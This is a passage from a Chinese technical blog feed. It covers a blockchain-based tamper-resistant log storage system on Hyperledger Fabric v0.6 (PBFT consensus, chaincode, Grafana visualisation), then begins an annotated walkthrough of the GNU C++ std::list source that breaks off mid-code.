log以及交易中的Key-Value。</li><li>P2P：基于Google的Grpc框架的底层网络通信层。</li><li>EventStream：事件订阅发布组建，用于接收交易及区块事件。贯穿于其他各个组件中间，为各个组件间的异步通信提供了技术实现</li><li>区块服务（BlockchainServices）：负责节点间的共识管理、账本的分布式计算、账本的存储以及节点间的P2P协议功能的实现，是区块链的核⼼心组成部分，为区块链的主体功能提供了底层⽀撑。</li></ul><p>Fabric v0.6版本的架构图如下：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/Fabric_v0.6_architecture.png"alt="Fabric v0.6架构图" /><figcaption aria-hidden="true">Fabric v0.6架构图</figcaption></figure><p>hyperledger fabricv0.6使用pbft (Practical Byzantine FaultTolerance,实用拜占庭容错算法)作为共识算法，可以在信任程度较低的场景下避免拜占庭问题。在3f+1个共识节点中能忍受f个节点出错且依然能实现正确共识，提高现实使用中的容错率，增强实用性。</p><p>下图为Fabric v0.6的运行流程图：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/fabric_v0.6_flowchart.png"alt="Fabric v0.6运行流程图" /><figcaption aria-hidden="true">Fabric v0.6运行流程图</figcaption></figure><p>日志收集模块需要先向Membership申请E-cert，通过E-cert去申请T-cert，由T-cert对应的私钥进行签名日志发送至VP节点进行三阶段共识，完成之后各个节点会通过Chaincode按顺序执行区块中的交易，并更新账本。</p><h4 id="可视化分析模块设计">可视化分析模块设计</h4><p>可视化分析模块基于grafana实现。我们开发grafana的插件，使其能够从区块链中读取日志并进行可视化分析。</p><p>Grafana是一款用Go语言开发的开源数据可视化工具，可以做数据监控和数据统计。Grafana具有以下特点：</p><ol type="1"><li>可视化：快速和灵活的客户端图形具有多种选项。面板插件为许多不同的方式可视化指标和日志。</li><li>报警：可视化地为最重要的指标定义警报规则。Grafana将持续评估它们，并发送通知。</li><li>通知：警报更改状态时，它会发出通知。接收电子邮件通知。</li><li>动态仪表盘：使用模板变量创建动态和可重用的仪表板，这些模板变量作为下拉菜单出现在仪表板顶部。</li><li>混合数据源：在同一个图中混合不同的数据源!可以根据每个查询指定数据源。这甚至适用于自定义数据源。</li><li>注释：注释来自不同数据源图表。将鼠标悬停在事件上可以显示完整的事件元数据和标记。</li><li>过滤器：过滤器允许您动态创建新的键/值过滤器，这些过滤器将自动应用于使用该数据源的所有查询。</li></ol><p>功能强大的grafana可以帮助我们方便地进行日志分析。</p><h2 id="详细实现">详细实现</h2><h3 id="日志收集模块">日志收集模块</h3><h4 id="filter">Filter</h4><p>在日志收集任务部署时可指定每行日志必须包含的字符串数组incl[]与不可包含的字符串数组exec[]。对每行日志进行判断是否满足包含所有incl[]内的字符串，及不包含exec[]内的字符串。若不满足要求，则把该行日志丢弃。</p><h4 id="extractor">extractor</h4><p>在日志收集任务部署时指定日志分隔符用于将该行日志分成若干段，并根据指定的对应关键字段名称及字段位置，提取出关键字段，同时将其余日志字段丢弃。也可通过不指定分隔符和关键字段名称，位置来不进行关键字段提取，这时返回整行日志。为了使日志在区块链中按时间顺序储存，在extract过程中判断有无timestamp字段，若无，则把当前时间添加到timestam字段。</p><h4 id="sender">sender</h4><p>在日志收集任务部署时指定目标区块链各节点的url，并以当前日志任务名作为日志包索引，将已经过滤和提取关键字段的日志利用fabricv0.6的restfulapi进行日志发送。在发送时，根据任务配置中的区块链节点，每次随机选取其中一个节点作为pbft共识的主节点，进行日志发送，从而每个区块链节点都作为主节点进行共识，提高共识并行性。</p><h3 id="区块链存储模块">区块链存储模块</h3><h4 id="接收并存储日志">接收并存储日志</h4><p>当区块链节点接收到日志收集模块发送的chaincodeinvoke请求时，chaincode通过一个事务请求来执行对账本的当前状态数据库操作。chaincode执行会生成一组读写集，将接收到的第一个参数，即日志文件路径作为ID，这组读写集将被提交到状态数据库储存，并转发给其他共识节点进行pbft共识。</p><p>下图为pbft执行过程：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/pbft_flowchart1.png"alt="pbft运行流程图1" /><figcaption aria-hidden="true">pbft运行流程图1</figcaption></figure><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/pbft_flowchart2.png"alt="pbft运行流程图2" /><figcaption aria-hidden="true">pbft运行流程图2</figcaption></figure><p>假设系统要求每次产生区块的时间间隔为𝑡，则在一切正常的情况下，算法按照以下流程执行：</p><ol type="1"><li>任意节点向全网广播日志数据，并附上发送者的签名</li><li>所有备份节点均独立监听全网的日志数据，并记录在内存</li><li>主节点在经过时间𝑡后,发送〈𝑃𝑒𝑟𝑝𝑎𝑟𝑒𝑅𝑒𝑞𝑢𝑒𝑠𝑡,ℎ,𝑣,𝑝,𝑏𝑙𝑜𝑐𝑘,〈𝑏𝑙𝑜𝑐𝑘〉𝜎𝑝〉</li><li>备份节点𝑖在收到提案后，发送〈𝑃𝑒𝑟𝑝𝑎𝑟𝑒𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒,ℎ,𝑣,𝑖,〈𝑏𝑙𝑜𝑐𝑘〉𝜎𝑖〉</li><li>任意节点在收到至少𝑛−𝑓个〈𝑏𝑙𝑜𝑐𝑘〉𝜎𝑖后，共识达成并发布完整的区块</li><li>任意节点在收到完整区块后，将包含的日志从内存中删除，并开始下一轮共识</li></ol><p>该算法要求参与共识的节点中，至少有𝑛−𝑓个节点具有相同的初始状态：即对于所有的节点𝑖，具有相同的区块高度ℎ和视图编号𝑣。而这个要求很容易达成：通过区块同步来达到ℎ的一致性，通过视图更换来达到𝑣的一致性。节点在监听全网交易以及在收到提案后，需要对交易进行合法性验证。如果发现非法交易，则不能将其写入内存池；如果非法交易包含在提案中，则放弃本次共识并立即开始视图更换。交易的验证流程如下：</p><ol type="1"><li>交易的数据格式是否符合系统规则，如果不符合则判定为非法；</li><li>交易在区块链中是否已经存在，如果存在则判定为非法；</li><li>交易的所有合约脚本是否都正确执行，如果没有则判定为非法；</li><li>交易中有没有多重支付行为，如果有则判定为非法；</li><li>如果以上判定都不符合，则为合法交易；</li></ol><p>当节点𝑖在经过2𝑣+1.𝑡的时间间隔后仍未达成共识，或接收到包含非法交易的提案后，开始进入视图更换流程：</p><ol type="1"><li>令𝑘 = 1，𝑣𝑘 = 𝑣 + 𝑘；</li><li>节点𝑖发出视图更换请求〈𝐶ℎ𝑎𝑛𝑔𝑒𝑉𝑖𝑒𝑤,ℎ,𝑣,𝑖,𝑣𝑘〉；</li><li>任意节点收到至少𝑛 − 𝑓个来自不同𝑖的相同𝑣𝑘后，视图更换达成，令𝑣 =𝑣𝑘并开始共识；</li><li>如果在经过2𝑣𝑘+1.𝑡的时间间隔后，视图更换仍未达成，则𝑘递增并回到第2步；</li></ol><p>随着𝑘的增加，超时的等待时间也会呈指数级增加，可以避免频繁的视图更换操作，并使各节点尽快对𝑣达成一致。而在视图更换达成之前，原来的视图𝑣依然有效，由此避免了因偶然性的网络延迟超时而导致不必要的视图更换。</p><p>最终日志在链上储存如下：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/On-chain_log_storage_diagram.png"alt="链上日志储存图" /><figcaption aria-hidden="true">链上日志储存图</figcaption></figure><h4 id="节点主动恢复的功能">节点主动恢复的功能</h4><p>区块链网络在运行过程中，可能出现网络抖动、磁盘故障等原因，可能会导致部分节点的执行速度落后大多数节点，因此需要添加主动恢复的功能才能参与后续的共识流程，为了解决这类问题，就需要通过主动索取共识网络中所有节点的视图，最新的区块高度等信息才能更新自身的数据状态，最终与系统的数据保持一致。</p><p>在节点启动、节点状态异常或者多次发起 viewchange却不被其他节点接受的时候，节点就应该发起主动恢复数据的请求，同步区块高度、共识网络视图等信息。</p><p>主动恢复的流程主要分为 2 步：</p><ul><li>NegotiateView 同步当前的视图信息和路由信息；</li><li>同步全网最新区块信息。</li></ul><p>以下为具体流程：</p><ol type="1"><li>待恢复节点首先广播 QueryView消息，获取网络中所有节点的当前视图信息和路由信息</li><li>其余正常节点收到 QueryView 消息后，返回当前节点的当前视图信息view，当前节点名称 ReplicaId 和路由信息 N（节点总数）</li><li>待恢复节点如果收到 quorum 个（2f+1）包含相同的 N 和 view的QueryViewResonse 消息，或者收到 2f 个包含相同 N 和 view 的报文且报文的view 不等于当前待恢复节点的 view，则将本节点的视图 view 同步成全成网络的view 和 N</li><li>待恢复节点广播 RevoeryToCheckpoint消息到网络所有节点，请求其余节点的检查点 checkpoint 信息和 pset、qset 和cset 的信息（即 PBFT 算法中 pre-prepare阶段、prepare 阶段和 commit阶段的数据）</li><li>正常节点收到 RevoeryToCheckpoint 消息和 RecoveryToPQC信息后，将自身的检查点信息和 PQC 信息返回给待恢复节点</li><li>待恢复节点收到 quorum 个 RevoeryToCheckpointResponse消息后，找到待恢复的稳定的 chekpoin 点，调用 stateUpdate 更新至 chekpoin点状态，更新完毕后如果发现自身的 checkpoint 仍然落后，则发送RecoveryToPQC 消息，获取 PQC 消息更新自身的 pset、qset 和 cset集合。</li></ol><p>当坏节点主动恢复时流程如下图：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/Node_active_recovery_flowchart.png"alt="节点主动恢复流程图" /><figcaption aria-hidden="true">节点主动恢复流程图</figcaption></figure><h4 id="查询日志">查询日志</h4><p>通过写 query chaincode,在其中调用 <code>ChaincodeStubInterface</code>接口的 <code>GetHistoryForKey()</code>方法来查询指定 ID的历史日志。外界可利用 fabric 的 <code>http api</code> 调用 querychaincode。</p><h4 id="chaincode智能合约">chaincode智能合约</h4><h5 id="init">init</h5><p>Init方法会在chaincode接收到instantiate（实例化）或者upgrade(升级)交易时被调用，进而使得chaincode顺利执行必要的初始化操作。在init参数中需给出当前日志任务名和其关键字名，创建一个空<code>[]map[string]interface&#123;&#125;</code>，用于以后存储日志。同时将关键字名存储在<code>[]string</code>中，用于grafana查询。并初始化日志条数为0。</p><h5 id="invoke">invoke</h5><p>日志收集模块触发invoke来进行日志存储。将sender发过来的日志切片进行Unmarshal反序列化后，append到已有的日志切片中，并按时间戳进行排序，保证按时间顺序存储。</p><h5 id="query">query</h5><p>Querychiancode设计了<code>search_keywords</code>，<code>get_num</code>，<code>get_logs</code>，<code>get_delete_info</code>四种方法供grafana查询。<code>search_keywords</code>用于查询有哪些关键字，返回<code>[]string</code>；<code>get_num</code>用于查询该任务在区块链中存了多少条日志，返回<code>[]byte(int64)</code>;<code>get_logs</code>返回每条日志的要查询的关键字段，返回<code>map[string][]interface&#123;&#125;</code>,即<code>map[关键字名称][content1,content2,...]</code>；<code>get_delete_info</code>查询历史delete操作信息，包括删除操作的时间，所删除的日志数。</p><h5 id="delete">delete</h5><p>用于对chaincode中所设定的时间以前的日志数据进行删除。触发<code>delete chaincode</code>，首先对所有日志按时间顺序进行遍历，并删除所有规定时间前的数据，最后记录本次删除操作的时间和删除日志数。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/blockchain_working_icon.png"alt="区块链工作图示" /><figcaption aria-hidden="true">区块链工作图示</figcaption></figure><h4 id="定期清理日志">定期清理日志</h4><p>为降低存储成本，我们考虑对区块链中存储的日志区块进行定期截断。当前考虑对区块链中半年前（时间可自定义，但是固定在chiancode中的，部署之后不可修改）的日志区块进行删除。我们在<code>init</code>,<code>invoke</code>,<code>query chaincode</code>的基础上添加<code>delete chaincode</code>，用于执行区块删除操作。在peer节点启动时开启一个线程去每天触发一次delete交易，这样该delete交易通过pbft共识到达所有peer节点后，执行deletechaincode去清理半年前的日志区块。</p><p>为不破坏区块链结构，我们保留一个半年前的区块，作为被截断后的区块链的创世区块，使得截断后的区块链能够通过hash校验，保证安全性。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/Truncated_schematic.png"alt="日志区块链截断示意图" /><figcaption aria-hidden="true">日志区块链截断示意图</figcaption></figure><h3 id="可视化分析模块">可视化分析模块</h3><p>Grafana作为最火热的开源数据可视化工具，最大的特点就是支持多种数据源以及丰富的插件库。SimpleJson是Grafana开源社区提供的数据源，它本身并不依赖某种特定的后端存储，只需要后端能实现Grafana报表的几个查询接口就行。SimpleJson是Grafana众多数据源插件中的一种，但它又不像其他插件配置好数据库信息就能用，开发者需要自己实现一部分数据源插件的功能来使SimpleJson插件能够使用。</p><p>我们基于SimpleJson编写grafana datasource插件，使grafana 可以通过fabric的 http api 调用 query chaincode读取储存在区块链中的日志数据。</p><h1 id="系统分析">系统分析</h1><p>本项目通过以区块链存储技术为支撑，设计并实现了一套为企业和个人用户存储日志的安全系统。相比于市面上已有的产品，具有较高的安全性，能有效防止日志遭到篡改或删除。同时提供了查询与可视化功能，方便用户针对日志进行分析，能及时有效了解服务器运行状况。</p><p>本项目的安全性分析如下：</p><ol type="1"><li><p>以区块链为依托提高数据安全性</p><p>本项目将日志实时发送至区块链并存储，黑客若想在本地节点篡改某一日志内容，那么根据存储的原理，首先需要伪造日志提交者的签名，姑且不论能否获得日志提交者的私钥，在签名伪造成功后，仍需持续更改本区块的hash值，这就会直接导致后续区块无法通过Hash值连接本区块，也就需要对后续区块的所有Hash值进行再计算，再更改。即使进行了如此大量的运算与更改，但也仅仅局限于本地节点的账本中区块链结构，仍需继续更改索引数据库和状态数据库。假设这些更改在本地都可以正确实施，但是，区块链是一个分布式的网络系统，单一节点的更改，必须得到其他足够多节点的认可并同步数据，这才能使后续业务正确实施。</p></li><li><p>引用pbft共识机制降低存储出错率</p><p>Pbft共识机制可以在信任程度较低的场景下避免拜占庭问题。在3f+1个共识节点中能忍受f个节点出错且依然能实现正确共识，存储日志，提高现实使用中的容错率，增强实用性；日志收集模块随机选取区块链peer节点当作共识主节点，使得多交易能够并行共识，提高系统共识效率。</p></li><li><p>多方签名防止日志、请求伪造</p><p>在系统部署时，区块链CA会对日志收集模块，区块链各节点和grafana插件发放证书，之后发送日志请求时，数据在分布式系统的节点间传播之前，均在本节点对数据进行一次摘要处理（Hash），并使用节点私钥对摘要实施非对称加密（签名），之后将数据与签名打包成消息传输给目标节点。在目标节点处对传输数据再实施一次摘要处理（Hash），并用原始节点的公钥解密签名后，将解密结果与摘要对比，验证一致方认为消息内容没有被篡改。从而可以防止非法用户对区块链调用chaincode，造成破坏。同时对与正常请求可根据签名追溯日志发送者，方便日后取证。</p></li><li><p>防止重复delete攻击</p><p>本系统新设置了deletechaincode方法用于定期截断区块链，删除设定时间之前的区块。如果黑客成功通过签名验证，为防止该chaincode被黑客利用去删除其他区块，我们将设定时间设为const变量，写死在chaincode中，一旦部署chaincode就不能更改，使得黑客即使重复调用deletechaincode也不能删除设定时间内的区块；同时，chaincode由go语言编写，利用go语言的安全性质，很难出现缓冲区溢出等漏洞去篡改时间变量。</p></li><li><p>日志多副本存储实现灾备</p><p>用区块链多节点共识存储的特性，使日志实现多副本存储，大大减小了因硬盘损坏等问题导致日志丢失的可能性。</p></li></ol><h1 id="总结">总结</h1><p>云存储技术的发展让人们看到了下一代互联网技术的发展方向，但同时数据泄露、数据篡改等问题限制了云存储技术的进一步发展。</p><p>基于区块链的安全日志系统为数据安全提供了很好的保障，该日志系统通过结合区块链技术，设计链上数据存储模式，有效地解决了日志文件易被篡改、数据泄露等问题，同时提供了可视化界面让用户能够使用日志相关的安全分析功能。</p><p>随着智能技术的不断发展，日志分析也应紧跟潮流，积极引入先进的技术，同时攻击手段和方法也在不停的变化和完善，因此需要多加注意这些变化，及时更新日志分析的方法，避免误判漏判的情况。目前本项目也存在一些问题：</p><ol type="1"><li>利用区块链存储日志记录，当日志变得很多的时候，由于所有的节点都需要保存有整个系统副本，因此会带来较大的存储开销。之后我们将进一步研究利用区块链的交叉级联特性，尽可能的减少冗余；</li><li>日志收集的任务部署尚未实现UI，目前只能手发http请求去部署收集任务；</li><li>可视化界面需要进一步优化，之后我们会丰富日志分析功能，同时设计界面布局，达到美观大方简洁的效果；</li></ol><p>目前的工作只是简单地实现了一个基于区块链的安全日志系统，接下来还需要对系统的提速，提高存储空间利用率进行更深一步研究，同时对于区块链在其他场景里的应用也可以做进一步的探索。</p><h1 id="参考文献">参考文献</h1><p>[1] 费禹，宁静，胡青.基于区块链的日志存储系统 [J].网络空间安全，2018, Vol. 9(6): 80-85.</p><p>[2] 韩菊茹，纪兆轩，李一鸣.基于区块链的可信日志存储与验证系统 [J].计算机工程，2019, Vol. 45(5): 13-17.</p><p>[3]徐治理，封化民，刘飙.一种基于信用的改进PBFT高效共识机制[J/OL].2019,36(10).[2018-06-09]</p><p>[4] 刘忆宁, 周元健, 蓝如师,等. 基于区块链的云数据删除验证协议[J].计算机研究与发展, 2018, 55(10):107-115.</p>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
      <tag>Log System</tag>
      
      <tag>Smart Contract</tag>
      
      <tag>Security Audit</tag>
      
      <tag>fabric</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stl-list实现分析</title>
    <link href="/2019/11/01/stl-list-implementation/"/>
    <url>/2019/11/01/stl-list-implementation/</url>
    
    <content type="html"><![CDATA[<h1 id="stl_list-介绍">stl_list 介绍</h1><p>今天我们来总结一下stl_List,与单链表比较而言，stl_list无非就是链表结构不一样，至于其中的增删改查的细节实现本质是一样的，都是处理指针偏移。<strong>相比于vector，stl_List在插入和删除的时候可以达到O(1)的时间复杂度</strong>。</p><p>stl_list是一个<strong>双向循环链表</strong>，相对单链表来说查找效率高，无论是插入时的前插和后插，还是从后往前查找某个元素等。既然查找效率高了，自然添加，删除和修改元素时效率也就更高。唯一一个可以称为不足的就是每个节点需要耗费4字节指针来保存前一个节点的地址，因此如果遇到对内存要求比较苛刻的场景，而且一些操作单链表即可满足，那么可以考虑使用标准库中的<strong>forward_list</strong>（单链表）。</p><h1 id="stl_list-源码分析">stl_list 源码分析</h1><p>分析gnuc++标准库中的stl_list，我们只需把握住整体结构即可，实现总共由三部分组成:</p><ul><li><strong>链表节点</strong>(struct_List_node : public__detail::_List_node_base)</li><li><strong>迭代器</strong>（struct _List_iterator）</li><li><strong>链表数据结构</strong>（class list : protected_List_base&lt;_Tp,_Alloc&gt;）。</li></ul><p>gnu下最新版本的stl_list实现加了一些额外的继承关系，_list_base中保存了一个_List_impl_M_impl中间变量，由该类_M_impl来保存节点，并对节点做基本处理。</p><h2 id="链表节点">链表节点</h2><p>父类维护两个指针，子类才加入具体的value。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">_List_node_base</span><br>&#123;<br>    _List_node_base* _M_next;<br>    _List_node_base* _M_prev;<br><br>&#125;;<br><br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">_List_node</span> : <span class="hljs-keyword">public</span> __detail::_List_node_base<br>&#123;<br>    <span class="hljs-comment">///&lt; User&#x27;s data.</span><br>    _Tp _M_data;<br><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="迭代器">迭代器</h2><p>主要是实现++和–等操作符重载，实现链表节点的前后移动。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp&gt;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_List_iterator</span><br>    &#123;<br>        <span class="hljs-keyword">typedef</span> _List_iterator&lt;_Tp&gt;                _Self;<br>        <span class="hljs-keyword">typedef</span> _List_node&lt;_Tp&gt;                    _Node;<br><br>        <span class="hljs-keyword">typedef</span> <span class="hljs-type">ptrdiff_t</span>                          difference_type;<br>        <span class="hljs-keyword">typedef</span> std::bidirectional_iterator_tag    iterator_category;<br>        <span class="hljs-keyword">typedef</span> _Tp                                value_type;<br>        <span class="hljs-keyword">typedef</span> _Tp*                               pointer;<br>        <span class="hljs-keyword">typedef</span> _Tp&amp;                               reference;<br><br>        _List_iterator() _GLIBCXX_NOEXCEPT<br>        : _M_node() &#123; &#125;<br><br>        <span class="hljs-keyword">explicit</span><br>        _List_iterator(__detail::_List_node_base* __x) _GLIBCXX_NOEXCEPT<br>        : _M_node(__x) &#123; &#125;<br><br>        _Self<br>        _M_const_cast() <span class="hljs-type">const</span> _GLIBCXX_NOEXCEPT<br>        &#123; <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>; &#125;<br><br>        <span class="hljs-comment">// Must downcast from _List_node_base to _List_node to get to _M_data.</span><br>        reference<br>        <span class="hljs-keyword">operator</span>*() <span class="hljs-type">const</span> _GLIBCXX_NOEXCEPT<br>        &#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">static_cast</span>&lt;_Node*&gt;(_M_node)-&gt;_M_data; &#125;<br><br>        pointer<br>        <span class="hljs-keyword">operator</span>-&gt;() <span class="hljs-type">const</span> _GLIBCXX_NOEXCEPT<br>        &#123; <span class="hljs-keyword">return</span> std::__addressof(<span class="hljs-built_in">static_cast</span>&lt;_Node*&gt;(_M_node)-&gt;_M_data); &#125;<br><br>        _Self&amp;<br>        <span class="hljs-keyword">operator</span>++() _GLIBCXX_NOEXCEPT<br>        &#123;<br>            _M_node = _M_node-&gt;_M_next;    <span class="hljs-comment">//本质是链表节点的next指针操作</span><br>            <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>        &#125;<br><br>        _Self<br>        <span class="hljs-keyword">operator</span>++(<span class="hljs-type">int</span>) _GLIBCXX_NOEXCEPT<br>        &#123;<br>            _Self __tmp = *<span class="hljs-keyword">this</span>;<br>            _M_node = _M_node-&gt;_M_next;<br>            <span class="hljs-keyword">return</span> __tmp;<br>        &#125;<br><br>        _Self&amp;<br>        <span class="hljs-keyword">operator</span>--() _GLIBCXX_NOEXCEPT<br>        &#123;<br>            _M_node = _M_node-&gt;_M_prev;  <span class="hljs-comment">//本质是链表节点的prev指针操作</span><br>            <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>        &#125;<br><br>        _Self<br>        <span class="hljs-keyword">operator</span>--(<span class="hljs-type">int</span>) _GLIBCXX_NOEXCEPT<br>        &#123;<br>            _Self __tmp = *<span class="hljs-keyword">this</span>;<br>            _M_node = _M_node-&gt;_M_prev;<br>            <span class="hljs-keyword">return</span> __tmp;<br>        &#125;<br><br>        <span class="hljs-type">bool</span><br>        <span class="hljs-keyword">operator</span>==(<span class="hljs-type">const</span> _Self&amp; __x) <span class="hljs-type">const</span> _GLIBCXX_NOEXCEPT<br>        &#123; <span class="hljs-keyword">return</span> _M_node == __x._M_node; &#125;<br><br>        <span class="hljs-type">bool</span><br>        <span class="hljs-keyword">operator</span>!=(<span class="hljs-type">const</span> _Self&amp; __x) <span class="hljs-type">const</span> _GLIBCXX_NOEXCEPT<br>        &#123; <span class="hljs-keyword">return</span> _M_node != __x._M_node; &#125;<br><br>        <span class="hljs-comment">// The only member points to the %list element.</span><br>        __detail::_List_node_base* _M_node; <span class="hljs-comment">//维护一个链表节点</span><br>    &#125;;<br></code></pre></td></tr></table></figure><h2 id="链表数据结构">链表数据结构</h2><p>实现类 _List_impl，主要用来维护链表节点，然后list类包含该类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">_List_impl</span><br>      : <span class="hljs-keyword">public</span> _Node_alloc_type<br>      &#123;<br><br>    __detail::_List_node_base _M_node;  <span class="hljs-comment">//其实就是维护节点，标准库中用了一个中间层来处理</span><br><br>    _List_impl()<br>    : _Node_alloc_type(), _M_node()<br>    &#123; &#125;<br><br>    _List_impl(<span class="hljs-type">const</span> _Node_alloc_type&amp; __a) _GLIBCXX_NOEXCEPT<br>    : _Node_alloc_type(__a), _M_node()<br>    &#123; &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> __cplusplus &gt;= 201103L</span><br>    _List_impl(_Node_alloc_type&amp;&amp; __a) _GLIBCXX_NOEXCEPT<br>    : _Node_alloc_type(std::<span class="hljs-built_in">move</span>(__a)), _M_node()<br>    &#123; &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125;;<br></code></pre></td></tr></table></figure><p>_List_base类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp, <span class="hljs-keyword">typename</span> _Alloc&gt;<br>   <span class="hljs-keyword">class</span> <span class="hljs-title class_">_List_base</span><br>   &#123;<br>   <span class="hljs-keyword">protected</span>:<br><br>     <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> _Alloc::<span class="hljs-keyword">template</span> rebind&lt;_List_node&lt;_Tp&gt; &gt;::other  _Node_alloc_type;<br><br>     <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> _Alloc::<span class="hljs-keyword">template</span> rebind&lt;_Tp&gt;::other _Tp_alloc_type;<br><br>     <span class="hljs-type">static</span> <span class="hljs-type">size_t</span><br>     _S_distance(<span class="hljs-type">const</span> __detail::_List_node_base* __first,<br>         <span class="hljs-type">const</span> __detail::_List_node_base* __last)<br>     &#123;<br>   <span class="hljs-type">size_t</span> __n = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">while</span> (__first != __last)<br>     &#123;<br>       __first = __first-&gt;_M_next;<br>       ++__n;<br>     &#125;<br>   <span class="hljs-keyword">return</span> __n;<br>     &#125;<br><br>     _List_impl _M_impl;    <span class="hljs-comment">// 中间层类</span><br><br>     <span class="hljs-comment">// count the number of nodes</span><br>     <span class="hljs-type">size_t</span> _M_node_count() <span class="hljs-type">const</span><br>     &#123;<br>   <span class="hljs-keyword">return</span> _S_distance(_M_impl._M_node._M_next,<br>              